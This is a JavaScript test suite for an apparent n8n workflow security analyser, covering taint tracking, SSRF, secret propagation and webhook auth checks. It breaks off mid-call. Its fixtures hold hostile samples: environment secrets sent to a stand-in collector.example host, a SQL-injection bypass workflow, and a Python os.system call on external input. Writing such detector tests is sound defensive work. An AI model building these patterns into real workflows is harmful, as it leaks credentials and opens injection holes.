import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import test from "node:test";
import { assessBytes } from "../dist/assessment-engine.js";
import { assessmentReportSchema } from "../dist/assessment-contract.js";
import { runGitleaks } from "../dist/gitleaks.js";
import { analyzeNativeInspection } from "../dist/native-inspection.js";
import {
  buildServiceReport,
  serviceReportSchema,
} from "../dist/service-report.js";
import { presentInspection, inspectionSchema } from "../dist/inspection.js";
import { analyzeContent } from "../dist/static-content.js";
import { createContext } from "../dist/static-context.js";
import {
  ruleResultSchema,
  staticReportSchema,
} from "../dist/static-contract.js";
import { analyzeStatic } from "../dist/static-engine.js";
import { analyzeFlow } from "../dist/static-flow.js";
import { analyzeSettings } from "../dist/static-settings.js";
import { buildValueFlow } from "../dist/value-flow.js";

const node = (name, type, typeVersion = 1, parameters = {}, raw = {}) => ({
  id: name,
  name,
  type: type.includes(".") ? type : `n8n-nodes-base.${type}`,
  typeVersion,
  parameters,
  ...raw,
});

const chain = (...nodes) => ({
  nodes,
  connections: Object.fromEntries(
    nodes
      .slice(0, -1)
      .map((item, idx) => [
        item.name,
        { main: [[{ node: nodes[idx + 1].name, type: "main", index: 0 }]] },
      ]),
  ),
});

const cleanGitleaks = {
  tool: "gitleaks",
  version: "8.30.1",
  status: "completed",
  findings: [],
};

const mockTools = async () => ({
  gitleaks: cleanGitleaks,
  native: {
    tool: "native_inspection",
    version: "1.0.0",
    modes: ["nlp", "python"].map((mode) => ({
      mode,
      status: "completed",
      findings: [],
      diagnostics:
        mode === "nlp"
          ? [{ fieldIndex: null, code: "nlp_english_model_profile" }]
          : [],
      versions: {
        python: "3.11.2",
        presidio: mode === "nlp" ? "2.2.366" : null,
        spacy: mode === "nlp" ? "3.8.18" : null,
        model: mode === "nlp" ? "en_core_web_sm@3.8.0" : null,
      },
    })),
  },
});

const assess = (workflow, evidence) => {
  const bytes = Buffer.from(JSON.stringify(workflow));
  const inputSha256 = createHash("sha256").update(bytes).digest("hex");
  return assessBytes(bytes, {
    evidenceBytes: evidence
      ? Buffer.from(JSON.stringify({ ...evidence, inputSha256 }))
      : undefined,
    collectTools: mockTools,
    now: "2026-11-26T00:00:00.000Z",
  });
};

const evidenceCodes = (rules) =>
  rules.flatMap((rule) =>
    rule.findings.flatMap((finding) =>
      finding.evidence.map((entry) => entry.code),
    ),
  );

test("declarative local catalog nodes preserve provenance while unsafe modes remain opaque", () => {
  for (const middle of [
    node("Dedup", "removeDuplicates", 2, {
      operation: "removeDuplicateInputItems",
      compare: "allFields",
    }),
    node("Order", "sort", 1, { type: "simple" }),
    node("Keep", "filter", 2.2, {
      conditions: {
        combinator: "and",
        conditions: [
          {
            leftValue: "={{ $json.body.kind }}",
            rightValue: "ok",
            operator: { type: "string", operation: "equals" },
          },
        ],
      },
    }),
  ]) {
    const doc = chain(
      node("In", "webhook", 2.1),
      middle,
      node("Req", "httpRequest", 4.2, { url: "={{ $json.body.url }}" }),
    );
    const ctx = createContext(Buffer.from(JSON.stringify(doc)));
    const rules = analyzeFlow(ctx);
    const ssrf = rules.find((r) => r.category === "ssrf");
    assert.ok(
      ssrf.findings.some((f) => f.claim === "supported_path"),
      middle.name,
    );
    assert.equal(
      ssrf.diagnostics.some(
        (d) =>
          d.code === "opaque_node_effects" &&
          d.location.nodeKey === ctx.nodeByName.get(middle.name).key,
      ),
      false,
      middle.name,
    );
  }

  for (const unsafe of [
    node("DedupStrip", "removeDuplicates", 2, {
      options: { removeOtherFields: true },
    }),
    node("DedupHistory", "removeDuplicates", 2, {
      operation: "clearDeduplicationHistory",
    }),
    node("CodeSort", "sort", 1, { type: "code" }),
    node("MergeCombine", "merge", 2, { mode: "combine" }),
  ]) {
    const doc = chain(
      node("In", "webhook", 2.1),
      unsafe,
      node("Req", "httpRequest", 4.2, { url: "={{ $json.body.url }}" }),
    );
    const ctx = createContext(Buffer.from(JSON.stringify(doc)));
    const ssrf = analyzeFlow(ctx).find((r) => r.category === "ssrf");
    assert.ok(
      ssrf.diagnostics.some(
        (d) =>
          d.code === "opaque_node_effects" &&
          d.location.nodeKey === ctx.nodeByName.get(unsafe.name).key,
      ),
      unsafe.name,
    );
  }
});

test("catalog external triggers, read connectors and HTML extraction preserve sensitivity and trust", () => {
  for (const [type, version] of [
    ["slackTrigger", 1],
    ["whatsAppTrigger", 1],
    ["@n8n/n8n-nodes-langchain.chatTrigger", 1.1],
  ]) {
    const doc = { nodes: [node("Trig", type, version)], connections: {} };
    const ctx = createContext(Buffer.from(JSON.stringify(doc)));
    const flow = buildValueFlow(ctx);
    const key = ctx.nodeByName.get("Trig").key;
    const msg = flow.output(key, "/chatInput");
    assert.equal(msg.trust, "external", type);
    assert.ok(msg.sensitivityClasses.includes("pii_candidate"), type);
    assert.ok(
      !flow.diagnostics.some((d) => d.code === "node_transform_unsupported"),
      type,
    );
  }

  const htmlDoc = chain(
    node("In", "webhook", 2.1),
    node("ParseHtml", "html", 1.2, {
      operation: "extractHtmlContent",
      dataPropertyName: "body",
    }),
  );
  const htmlCtx = createContext(Buffer.from(JSON.stringify(htmlDoc)));
  const htmlFlow = buildValueFlow(htmlCtx);
  const parsed = htmlFlow.output(
    htmlCtx.nodeByName.get("ParseHtml").key,
    "/title",
  );
  assert.equal(parsed.trust, "external");
  assert.ok(
    !htmlFlow.diagnostics.some((d) => d.code === "node_transform_unsupported"),
  );
});

test("extended JS expression operators, Date/Luxon chains, Math and regex literals retain sensitive inputs", () => {
  const doc = chain(
    node("In", "webhook", 2.1),
    node("Map", "set", 3.4, {
      assignments: {
        assignments: [
          {
            name: "sliced",
            type: "string",
            value: "={{ $json.body.password.slice(0, -1) }}",
          },
          {
            name: "guarded",
            type: "string",
            value:
              "={{ !$json.body.skip && $json.body.status === 'active' ? $json.body.email : 'none' }}",
          },
          {
            name: "stamped",
            type: "string",
            value:
              "={{ new Date($json.body.password).toISOString() + $now.minus({ days: 1 }).toFormat($json.body.email) }}",
          },
          {
            name: "mathAndRegex",
            type: "string",
            value:
              "={{ String(Math.max(1, Number($json.body.password))) + $json.body.email.replace(/\\s+/g, '') }}",
          },
          {
            name: "metaOnly",
            type: "string",
            value:
              "={{ $workflow.id + ':' + $execution.id + ':' + $itemIndex + ':' + Date.now() }}",
          },
        ],
      },
    }),
  );
  const ctx = createContext(Buffer.from(JSON.stringify(doc)));
  const flow = buildValueFlow(ctx);
  const mapKey = ctx.nodeByName.get("Map").key;

  assert.ok(
    flow
      .output(mapKey, "/sliced")
      .sensitivityClasses.includes("secret_candidate"),
  );
  assert.ok(
    flow
      .output(mapKey, "/guarded")
      .sensitivityClasses.includes("pii_candidate"),
  );
  const stamped = flow.output(mapKey, "/stamped");
  assert.ok(stamped.sensitivityClasses.includes("secret_candidate"));
  assert.ok(stamped.sensitivityClasses.includes("pii_candidate"));
  const mathRegex = flow.output(mapKey, "/mathAndRegex");
  assert.ok(mathRegex.sensitivityClasses.includes("secret_candidate"));
  assert.ok(mathRegex.sensitivityClasses.includes("pii_candidate"));

  const meta = flow.output(mapKey, "/metaOnly");
  assert.equal(meta.sensitivity, "public_literal");
  assert.equal(meta.constant, undefined);
  assert.equal(
    flow.diagnostics.some((d) => d.code === "expression_semantics_unsupported"),
    false,
  );
});

test("bounded Code for-of loops with nested blocks, continue/break and ++ preserve sensitive flows", () => {
  const jsCode = `
    const items = [$json.body.email, "public"];
    let collected = "";
    let index = 0;
    for (const current of items) {
      {
        index++;
        if (!current) continue;
        if (index > 10) break;
        collected += current;
      }
    }
    return [{ json: { summary: collected, clean: "constant" } }];
  `;
  const doc = chain(
    node("In", "webhook", 2.1),
    node("Transform", "code", 2, { jsCode }),
  );
  const ctx = createContext(Buffer.from(JSON.stringify(doc)));
  const flow = buildValueFlow(ctx);
  const key = ctx.nodeByName.get("Transform").key;
  const summary = flow.output(key, "/summary");
  const clean = flow.output(key, "/clean");
  assert.ok(summary.sensitivityClasses.includes("pii_candidate"));
  assert.equal(clean.sensitivity, "public_literal");
  assert.equal(
    flow.diagnostics.some(
      (d) => d.code === "code_statement_profile_unresolved",
    ),
    false,
  );
  assert.equal(
    flow.diagnostics.some((d) => d.code === "code_source_observations_only"),
    false,
  );
});

test("0.10.0 service report separates sink-reachable vs isolated gaps while preserving 0.9.0 compatibility", async () => {
  // Disconnected future local node has no path to the HTTP sink; upstream unknown node does.
  const workflow = {
    nodes: [
      node("Start", "manualTrigger", 1),
      node("UpstreamOpaque", "set", 99),
      node("Sink", "httpRequest", 4.2, { url: "https://example.com" }),
      node("IsolatedOpaque", "limit", 99),
    ],
    connections: {
      Start: {
        main: [
          [
            { node: "UpstreamOpaque", type: "main", index: 0 },
            { node: "IsolatedOpaque", type: "main", index: 0 },
          ],
        ],
      },
      UpstreamOpaque: {
        main: [[{ node: "Sink", type: "main", index: 0 }]],
      },
    },
  };
  const report = await assess(workflow);
  assert.equal(report.engineVersion, "0.10.0");
  const service = buildServiceReport(report);
  assert.ok(serviceReportSchema.safeParse(service).success);
  assert.ok(service.serviceScope.sinkReachableGapCount > 0);
  assert.ok(service.serviceScope.isolatedGapCount > 0);
  assert.equal(
    service.serviceScope.sinkReachableGapCount +
      service.serviceScope.isolatedGapCount,
    service.counts.analysisGaps,
  );
  const inspection = await presentInspection(report);
  assert.ok(inspectionSchema.safeParse(inspection).success);

  // Historical 0.9.0 reports must keep their exact legacy serviceScope shape.
  const historical = { ...structuredClone(report), engineVersion: "0.9.0" };
  const historicalService = buildServiceReport(historical);
  assert.equal(historicalService.engineVersion, "0.9.0");
  assert.equal(historicalService.serviceScope.sinkReachableGapCount, undefined);
  assert.equal(historicalService.serviceScope.isolatedGapCount, undefined);
});

test("review regressions: for-of branch break/continue retains secrets and origins", () => {
  for (const jump of ["break;", "continue;"]) {
    const jsCode = `
      let out = "public";
      for (const x of [1, 2]) {
        if (x === 1) {
          out = $env.SECRET_API_KEY;
          ${jump}
        }
      }
      return [{ json: { result: out } }];
    `;
    const doc = chain(
      node("In", "webhook", 2.1),
      node("Transform", "code", 2, { jsCode }),
    );
    const ctx = createContext(Buffer.from(JSON.stringify(doc)));
    const flow = buildValueFlow(ctx);
    const out = flow.output(ctx.nodeByName.get("Transform").key, "/result");
    assert.ok(out.sensitivityClasses.includes("secret_candidate"), jump);
    assert.ok(
      out.origins.some((origin) => origin.kind === "credential"),
      jump,
    );
  }

  // Both if/else branches terminating via break/continue must still merge loop exits.
  const bothJumpCode = `
    let out = "public";
    for (const x of [1, 2]) {
      if (x === 1) {
        out = $env.SECRET_ONE;
        break;
      } else {
        out = $json.body.email;
        continue;
      }
    }
    return [{ json: { result: out } }];
  `;
  const ctx2 = createContext(
    Buffer.from(
      JSON.stringify(
        chain(
          node("In", "webhook", 2.1),
          node("Transform", "code", 2, { jsCode: bothJumpCode }),
        ),
      ),
    ),
  );
  const out2 = buildValueFlow(ctx2).output(
    ctx2.nodeByName.get("Transform").key,
    "/result",
  );
  assert.ok(out2.sensitivityClasses.includes("secret_candidate"));
  assert.ok(out2.sensitivityClasses.includes("pii_candidate"));
});

test("review regressions: html/supabase/dropbox defaults, mutating filter guards, and clock/regex projections stay sound", async () => {
  // 1. Default html (`generateHtmlTemplate`), `extractHtmlContent` field classification, default supabase (`create`), and dropbox `download`.
  const htmlTemplateCtx = createContext(
    Buffer.from(
      JSON.stringify({
        nodes: [node("Tpl", "html", 1.2, { html: "={{ $env.SECRET_TOKEN }}" })],
        connections: {},
      }),
    ),
  );
  const tplOut = buildValueFlow(htmlTemplateCtx).output(
    htmlTemplateCtx.nodeByName.get("Tpl").key,
    "/html",
  );
  assert.ok(tplOut.sensitivityClasses.includes("secret_candidate"));
  assert.ok(tplOut.origins.some((o) => o.kind === "credential"));

  const extractCtx = createContext(
    Buffer.from(
      JSON.stringify(
        chain(
          node("Start", "manualTrigger", 1),
          node("Extract", "html", 1.2, {
            operation: "extractHtmlContent",
            dataPropertyName: "data",
          }),
        ),
      ),
    ),
  );
  const extractedKey = buildValueFlow(extractCtx).output(
    extractCtx.nodeByName.get("Extract").key,
    "/api_key",
  );
  assert.ok(extractedKey.sensitivityClasses.includes("secret_candidate"));

  for (const downstream of [
    node("SupaInsert", "supabase", 1, {}),
    node("DropDownload", "dropbox", 1, { operation: "download" }),
  ]) {
    const doc = chain(
      node("SetSecret", "set", 3.4, {
        assignments: {
          assignments: [
            {
              name: "customField",
              type: "string",
              value: "={{ $env.DB_SECRET }}",
            },
          ],
        },
      }),
      downstream,
    );
    const ctx = createContext(Buffer.from(JSON.stringify(doc)));
    const val = buildValueFlow(ctx).output(
      ctx.nodeByName.get(downstream.name).key,
      "/customField",
    );
    assert.ok(
      val.sensitivityClasses.includes("secret_candidate"),
      downstream.name,
    );
  }

  // 2. Mutating expression inside `filter` must NOT preserve upstream strict number guard or hide $env secrets.
  const sqlBypassWorkflow = {
    nodes: [
      node("In", "webhook", 2.1),
      node("Guard", "if", 2.2, {
        conditions: {
          options: { typeValidation: "strict" },
          combinator: "and",
          conditions: [
            {
              leftValue: "={{ $json.body.id }}",
              rightValue: 42,
              operator: { type: "number", operation: "equals" },
            },
          ],
        },
      }),
      node("MutateFilter", "filter", 2.2, {
        conditions: {
          combinator: "and",
          conditions: [
            {
              leftValue:
                "={{ Object.assign($json.body, { id: $json.body.rawSql }).kind }}",
              rightValue: "ok",
              operator: { type: "string", operation: "equals" },
            },
          ],
        },
      }),
      node("Db", "mySql", 2.4, {
        operation: "executeQuery",
        query: "=SELECT * FROM users WHERE id = {{ $json.body.id }}",
      }),
    ],
    connections: {
      In: { main: [[{ node: "Guard", type: "main", index: 0 }]] },
      Guard: { main: [[{ node: "MutateFilter", type: "main", index: 0 }]] },
      MutateFilter: { main: [[{ node: "Db", type: "main", index: 0 }]] },
    },
  };
  const sqlReport = await assess(sqlBypassWorkflow);
  const advSql = sqlReport.files[0].extensionRules.find(
    (r) => r.ruleId === "N8N_ADVANCED_SQL",
  );
  assert.ok(advSql.findings.some((f) => f.severity === "high"));

  // 3. Property projection on clock/Date/regex must retain secret/PII sensitivity.
  const projCtx = createContext(
    Buffer.from(
      JSON.stringify(chain(node("In", "webhook", 2.1), node("Use", "noOp", 1))),
    ),
  );
  const projFlow = buildValueFlow(projCtx);
  const useKey = projCtx.nodeByName.get("Use").key;
  assert.ok(
    projFlow
      .resolve(useKey, "={{ $now.toFormat($json.body.password).length }}")
      .sensitivityClasses.includes("secret_candidate"),
  );
  assert.ok(
    projFlow
      .resolve(useKey, "={{ (new Date($json.body.password)).foo }}")
      .sensitivityClasses.includes("secret_candidate"),
  );
  assert.ok(
    projFlow
      .resolve(useKey, "={{ /admin@example\\.com/.source }}")
      .sensitivityClasses.includes("pii_candidate"),
  );
});

test("review regressions: sink-reachable gap accounting covers lastNode webhooks, stopAndError, code sort, rssFeedRead, and cross-branch references", async () => {
  for (const [label, workflow] of [
    [
      "webhook_lastNode",
      chain(
        node("In", "webhook", 2.1, { responseMode: "lastNode" }),
        node("Opaque", "set", 99),
      ),
    ],
    [
      "stopAndError",
      chain(
        node("In", "webhook", 2.1),
        node("Opaque", "set", 99),
        node("Fail", "stopAndError", 1, {
          errorMessage: "={{ $json.body.x }}",
        }),
      ),
    ],
    [
      "sort_code",
      chain(
        node("In", "webhook", 2.1),
        node("CodeSort", "sort", 1, { type: "code" }),
      ),
    ],
    ["rss_feed", { nodes: [node("Rss", "rssFeedRead", 99)], connections: {} }],
    [
      "cross_branch_last",
      {
        nodes: [
          node("Start", "manualTrigger", 1),
          node("BranchOpaque", "set", 99),
          node("Sink", "httpRequest", 4.2, {
            url: "={{ $('BranchOpaque').last().json.url }}",
          }),
        ],
        connections: {
          Start: {
            main: [
              [
                { node: "BranchOpaque", type: "main", index: 0 },
                { node: "Sink", type: "main", index: 0 },
              ],
            ],
          },
        },
      },
    ],
    [
      "cross_branch_all_uninspected_sink",
      {
        nodes: [
          node("Start", "manualTrigger", 1),
          node("BranchOpaque", "set", 99),
          node("CustomSink", "communityCustomNode", 1, {
            payload: "={{ $('BranchOpaque').all()[0].json.url }}",
          }),
        ],
        connections: {
          Start: {
            main: [
              [
                { node: "BranchOpaque", type: "main", index: 0 },
                { node: "CustomSink", type: "main", index: 0 },
              ],
            ],
          },
        },
      },
    ],
  ]) {
    const report = await assess(workflow);
    const service = buildServiceReport(report);
    assert.ok(service.serviceScope.sinkReachableGapCount > 0, label);
    assert.equal(service.serviceScope.isolatedGapCount, 0, label);
  }
});

test("2nd-pass regressions: BlockStatement lexical scoping, html_extract external trust, and code/chatTrigger/subworkflow reachability", async () => {
  // 1. BlockStatement must not leak inner const/let bindings (`items`) into outer scope.
  const shadowWorkflow = chain(
    node("SetSecret", "set", 3.4, {
      assignments: {
        assignments: [
          { name: "val", type: "string", value: "={{ $env.SECRET_API_KEY }}" },
        ],
      },
    }),
    node("CodeBlock", "code", 2, {
      jsCode: `
        { const items = [{ json: { val: "safe" } }]; }
        { const items = [{ json: { val: "also_safe" } }]; }
        return [{ json: { leak: items[0].json.val } }];
      `,
    }),
    node("Out", "respondToWebhook", 1.1, {
      respondWith: "text",
      responseBody: "={{ $json.leak }}",
    }),
  );
  const shadowReport = await assess(shadowWorkflow);
  const extOutput = shadowReport.files[0].extensionRules.find(
    (r) => r.ruleId === "N8N_EXTENDED_OUTPUT_DATA",
  );
  assert.ok(
    extOutput.findings.some((f) =>
      f.evidence.some((e) => e.code === "secret_candidate_transferred"),
    ),
  );

  // 2. HTML extractHtmlContent preserves external trust even with internal sibling fields or parameter expressions.
  const htmlSiblingDoc = chain(
    node("Fetch", "httpRequest", 4.2, { url: "https://example.com/feed" }),
    node("Tag", "set", 3.4, {
      includeOtherFields: true,
      assignments: {
        assignments: [{ name: "tag", type: "string", value: "news" }],
      },
    }),
    node("ParseHtml", "html", 1.2, {
      operation: "extractHtmlContent",
      dataPropertyName: "data",
      extractionValues: {
        values: [{ key: "headline", cssSelector: "={{ 'article.post' }}" }],
      },
    }),
  );
  const htmlSiblingCtx = createContext(
    Buffer.from(JSON.stringify(htmlSiblingDoc)),
  );
  const htmlSiblingOut = buildValueFlow(htmlSiblingCtx).output(
    htmlSiblingCtx.nodeByName.get("ParseHtml").key,
    "/headline",
  );
  assert.equal(htmlSiblingOut.trust, "external");

  // 3. Sink-reachable gap accounting for runOnceForEachItem Code cross-refs, chatTrigger chains, and executeWorkflowTrigger chains.
  for (const [label, workflow] of [
    [
      "each_item_code_cross_ref",
      {
        nodes: [
          node("Start", "manualTrigger", 1),
          node("BranchOpaque", "set", 99),
          node("EachItem", "code", 2, {
            mode: "runOnceForEachItem",
            jsCode: "return { json: { u: $('BranchOpaque').item.json.url } };",
          }),
          node("Sink", "httpRequest", 4.2, { url: "https://example.com" }),
        ],
        connections: {
          Start: {
            main: [
              [
                { node: "BranchOpaque", type: "main", index: 0 },
                { node: "EachItem", type: "main", index: 0 },
              ],
            ],
          },
          EachItem: { main: [[{ node: "Sink", type: "main", index: 0 }]] },
        },
      },
    ],
    [
      "chat_trigger_chain",
      chain(
        node("Chat", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1),
        node("Opaque", "set", 99),
      ),
    ],
    [
      "subworkflow_trigger_chain",
      chain(
        node("SubIn", "executeWorkflowTrigger", 1.1),
        node("Opaque", "set", 99),
      ),
    ],
  ]) {
    const report = await assess(workflow);
    const service = buildServiceReport(report);
    assert.ok(service.serviceScope.sinkReachableGapCount > 0, label);
    assert.equal(service.serviceScope.isolatedGapCount, 0, label);
  }
});

test("B1: literal template prefixes preserve external trust across AI prompts, SSRF, and command sinks", async () => {
  const aiDoc = {
    nodes: [
      node("Webhook", "webhook", 2.1),
      node("Agent", "@n8n/n8n-nodes-langchain.agent", 1.7, {
        promptType: "define",
        text: "=Summarize: {{ $json.body.text }}",
      }),
      node("Tool", "httpRequestTool", 4.2, { url: "https://example.invalid" }),
    ],
    connections: {
      Webhook: { main: [[{ node: "Agent", type: "main", index: 0 }]] },
      Tool: { ai_tool: [[{ node: "Agent", type: "ai_tool", index: 0 }]] },
    },
  };
  const aiReport = assessmentReportSchema.parse(await assess(aiDoc));
  assert.ok(
    evidenceCodes(aiReport.files[0].extensionRules).includes(
      "ai_external_prompt_may_influence_tool_selection",
    ),
  );

  for (const [label, trigger] of [
    ["telegram", node("Trigger", "telegramTrigger", 1.2)],
    ["form", node("Trigger", "formTrigger", 2.3)],
    ["chat", node("Trigger", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1)],
  ]) {
    const ssrfDoc = chain(
      trigger,
      node("Req", "httpRequest", 4.2, {
        url: "=https://{{ $json.message.text }}/api",
      }),
    );
    const ssrfReport = assessmentReportSchema.parse(await assess(ssrfDoc));
    const ssrf = ssrfReport.files[0].extensionRules.find(
      (r) => r.ruleId === "N8N_MAPPED_HTTP_DESTINATION",
    );
    assert.ok(
      ssrf.findings.some(
        (f) =>
          f.severity === "high" &&
          f.evidence.some(
            (e) => e.code === "http_destination_external_input_candidate",
          ),
      ),
      label,
    );
  }
});

test("B2-B4: code spread, runOnceForEachItem code mode, and credential projections retain secret candidates", async () => {
  const spreadDoc = chain(
    node("Start", "manualTrigger", 1),
    node("Code", "code", 2, {
      jsCode:
        "return $input.all().map(i => ({ json: { k: $env.STRIPE, ...i.json } }));",
    }),
    node("Req", "httpRequest", 4.2, {
      url: "=https://collector.example/c?k={{ $json.k }}",
    }),
  );
  const spreadReport = await assess(spreadDoc);
  assert.ok(
    evidenceCodes(spreadReport.files[0].extensionRules).includes(
      "secret_candidate_transferred",
    ),
  );

  const eachItemDoc = chain(
    node("Start", "manualTrigger", 1),
    node("Code", "code", 2, {
      mode: "runOnceForEachItem",
      jsCode: "return { json: { x: $env.STRIPE } };",
    }),
    node("Req", "httpRequest", 4.2, {
      url: "=https://collector.example/c?x={{ $json.x }}",
    }),
  );
  const eachItemReport = await assess(eachItemDoc);
  assert.ok(
    evidenceCodes(eachItemReport.files[0].extensionRules).includes(
      "secret_candidate_transferred",
    ),
  );

  const setCredDoc = chain(
    node("Start", "manualTrigger", 1),
    node("Set", "set", 3.4, {
      assignments: {
        assignments: [{ name: "cfg", type: "object", value: "={{ $env }}" }],
      },
    }),
    node("Req", "httpRequest", 4.2, {
      url: "=https://collector.example/c?k={{ $json.cfg.STRIPE }}",
    }),
  );
  const setCredReport = await assess(setCredDoc);
  assert.ok(
    evidenceCodes(setCredReport.files[0].extensionRules).includes(
      "secret_candidate_transferred",
    ),
  );

  const codeCredDoc = chain(
    node("Start", "manualTrigger", 1),
    node("Code", "code", 2, {
      jsCode:
        "const cfg = { env: $env }; return [{ json: { k: cfg.env.STRIPE } }];",
    }),
    node("Req", "httpRequest", 4.2, {
      url: "=https://collector.example/c?k={{ $json.k }}",
    }),
  );
  const codeCredReport = await assess(codeCredDoc);
  assert.ok(
    evidenceCodes(codeCredReport.files[0].extensionRules).includes(
      "secret_candidate_transferred",
    ),
  );
});

test("B5-B6: request_auth covers form/chat/mcp triggers and transport/egress cover httpRequestTool", async () => {
  const unauthTriggers = [
    node("Form", "formTrigger", 2.3, { authentication: "none" }),
    node("Chat", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1, {
      public: true,
      authentication: "none",
    }),
    node("Mcp", "@n8n/n8n-nodes-langchain.mcpTrigger", 2, {
      authentication: "none",
    }),
  ];
  for (const trigger of unauthTriggers) {
    const authRule = analyzeSettings(
      createContext(
        Buffer.from(JSON.stringify({ nodes: [trigger], connections: {} })),
      ),
    ).find((r) => r.category === "request_auth");
    assert.equal(authRule.coverage[0].status, "checked", trigger.name);
    assert.ok(
      evidenceCodes([authRule]).includes("webhook_authentication_none"),
      trigger.name,
    );
    const blocked = await assess(
      { nodes: [trigger], connections: {} },
      {
        schemaVersion: "1.0.0",
        sources: [
          {
            id: "src-1",
            kind: "declaration",
            method: "user_declaration",
            recordedAt: "2026-11-26T00:00:00.000Z",
          },
        ],
        policy: {
          id: "strict-auth",
          version: "1.0.0",
          sourceId: "src-1",
          purpose: "require request authentication",
          defaultDecision: "allow",
          unknownDecision: "review",
          rules: [],
          egress: [],
          exceptions: [],
          requireAuthenticatedWebhook: true,
          requireAiApproval: false,
          requirePublicationReview: true,
        },
      },
    );
    assert.equal(blocked.decision, "block", trigger.name);
  }

  const privateChat = analyzeSettings(
    createContext(
      Buffer.from(
        JSON.stringify({
          nodes: [
            node("Chat", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1, {
              public: false,
            }),
          ],
          connections: {},
        }),
      ),
    ),
  ).find((r) => r.category === "request_auth");
  assert.equal(privateChat.coverage[0].status, "checked");
  assert.equal(privateChat.findings.length, 0);

  const authChat = analyzeSettings(
    createContext(
      Buffer.from(
        JSON.stringify({
          nodes: [
            node("Chat", "@n8n/n8n-nodes-langchain.chatTrigger", 1.1, {
              public: true,
              authentication: "n8nUserAuth",
            }),
          ],
          connections: {},
        }),
      ),
    ),
  ).find((r) => r.category === "request_auth");
  assert.equal(authChat.coverage[0].status, "checked");
  assert.ok(
    evidenceCodes([authChat]).includes("webhook_authentication_configured"),
  );

  const httpToolDoc = {
    nodes: [
      node("Webhook", "webhook", 2.1),
      node("Agent", "@n8n/n8n-nodes-langchain.agent", 1.7, {
        text: "={{ $json.body.text }}",
      }),
      node("Tool", "httpRequestTool", 4.2, {
        url: "http://collector.example/api",
        options: { allowUnauthorizedCerts: true },
      }),
    ],
    connections: {
      Webhook: { main: [[{ node: "Agent", type: "main", index: 0 }]] },
      Tool: { ai_tool: [[{ node: "Agent", type: "ai_tool", index: 0 }]] },
    },
  };
  const httpToolReport = assessmentReportSchema.parse(
    await assess(httpToolDoc),
  );
  const allRules = [
    ...httpToolReport.files[0].base.rules,
    ...httpToolReport.files[0].extensionRules,
  ];
  assert.ok(
    evidenceCodes(allRules).includes("tls_certificate_validation_disabled"),
  );
  assert.ok(evidenceCodes(allRules).includes("plaintext_http_url"));
  assert.ok(
    allRules
      .find((r) => r.ruleId === "N8N_EXTENDED_OUTBOUND_DATA")
      .findings.some((f) =>
        f.evidence.some((e) => e.code === "outbound_send_capability"),
      ),
  );
});

test("C1-C4: native scope diagnostic reservation, CR Python lines, empty string skipping, and cross-field gitleaks", async () => {
  // C1: 130 scope diagnostics must not crowd out native_input_scope_limit or native_finding_limit.
  const koreanNotes = Object.fromEntries(
    Array.from({ length: 130 }, (_, i) => [`k${i}`, `한글 메모 ${i}`]),
  );
  const c1Doc = {
    nodes: [node("Start", "manualTrigger", 1)],
    connections: {},
    notes: koreanNotes,
  };
  const c1Ctx = createContext(Buffer.from(JSON.stringify(c1Doc)));
  const noteFields = c1Ctx.fields.filter(
    (f) => f.kind === "value" && f.pointer.startsWith("/notes/"),
  );
  const nativeScan = {
    tool: "native_inspection",
    version: "1.0.0",
    modes: [
      {
        mode: "nlp",
        status: "completed",
        findings: [],
        diagnostics: [
          { fieldIndex: null, code: "nlp_english_model_profile" },
          ...noteFields.map((f) => ({
            fieldIndex: f.index,
            code: "nlp_language_outside_profile",
          })),
          { fieldIndex: null, code: "native_input_scope_limit" },
          { fieldIndex: null, code: "native_finding_limit" },
        ],
        versions: {
          python: "3.11.2",
          presidio: "2.2.366",
          spacy: "3.8.18",
          model: "en_core_web_sm@3.8.0",
        },
      },
      {
        mode: "python",
        status: "completed",
        findings: [],
        diagnostics: [],
        versions: {
          python: "3.11.2",
          presidio: null,
          spacy: null,
          model: null,
        },
      },
    ],
  };
  const c1Rules = analyzeNativeInspection(c1Ctx, nativeScan).map((r) =>
    ruleResultSchema.parse(r),
  );
  const nlpRule = c1Rules[0];
  assert.ok(nlpRule.diagnostics.length <= 128);
  assert.ok(
    nlpRule.diagnostics.some((d) => d.code === "native_input_scope_limit"),
  );
  assert.ok(nlpRule.diagnostics.some((d) => d.code === "native_finding_limit"));

  const c1Report = await assessBytes(Buffer.from(JSON.stringify(c1Doc)), {
    collectTools: async () => ({ gitleaks: cleanGitleaks, native: nativeScan }),
    now: "2026-11-26T00:00:00.000Z",
  });
  const c1Service = serviceReportSchema.parse(buildServiceReport(c1Report));
  assert.equal(c1Service.analysisStatus, "review_required");
  assert.equal(c1Service.serviceScope.securityReviewRequired, true);

  // Non-string language field on Code node must not throw TypeError in pythonNode.
  const badLangDoc = {
    nodes: [
      node("CodeBad", "code", 2, {
        language: { unexpected: true },
        jsCode: "return [];",
      }),
    ],
    connections: {},
  };
  const badLangReport = assessmentReportSchema.parse(await assess(badLangDoc));
  assert.notEqual(badLangReport.status, "error");

  // C2: standalone \r line endings in Python code must validate line numbers cleanly.
  const crDoc = {
    nodes: [
      node("Py", "code", 2, {
        language: "pythonNative",
        pythonCode: "import os\rx=1\ros.system(_json['c'])",
      }),
    ],
    connections: {},
  };
  const crCtx = createContext(Buffer.from(JSON.stringify(crDoc)));
  const pyField = crCtx.fields.find(
    (f) => f.kind === "value" && f.pointer.endsWith("/pythonCode"),
  );
  const crRules = analyzeNativeInspection(crCtx, {
    tool: "native_inspection",
    version: "1.0.0",
    modes: [
      {
        mode: "python",
        status: "completed",
        findings: [
          {
            fieldIndex: pyField.index,
            code: "python_external_input_shell_call",
            start: null,
            end: null,
            line: 3,
          },
        ],
        diagnostics: [
          { fieldIndex: pyField.index, code: "python_static_profile_limited" },
        ],
        versions: {
          python: "3.11.2",
          presidio: null,
          spacy: null,
          model: null,
        },
      },
    ],
  }).map((r) => ruleResultSchema.parse(r));
  assert.equal(
    crRules[0].diagnostics.some((d) => d.code === "native_invalid_report"),
    false,
  );
  assert.ok(
    crRules[0].findings.some((f) =>
      f.evidence.some((e) => e.code === "python_external_input_shell_call"),
    ),
  );

  // C3: >16,384 empty strings must not trigger tool_input_limit before scanning.
  const emptyFields = Array.from({ length: 16_385 }, (_, index) => ({
    index,
    value: "",
  }));
  const emptyScan = await runGitleaks(emptyFields, {
